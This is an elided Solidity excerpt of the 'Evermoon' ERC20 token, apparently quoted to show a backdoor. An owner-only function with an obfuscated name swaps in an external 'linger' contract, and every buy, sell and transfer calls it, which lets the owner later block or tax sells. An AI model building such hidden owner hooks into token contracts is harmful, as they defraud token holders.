...
contract TokenM is ERC20 {
    ...
    IUserAmountlinger public linger;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Evermoon", "EVM") {
    ...
    function cuuyrttrBuujimRoot(IUserAmountlinger _linger) public onlyOwner {
        linger = _linger;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                linger.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				linger.addOutAmount(from, amount);
            }else{
                linger.addOutAmount(from, amount);
                takeFee = false;
            }
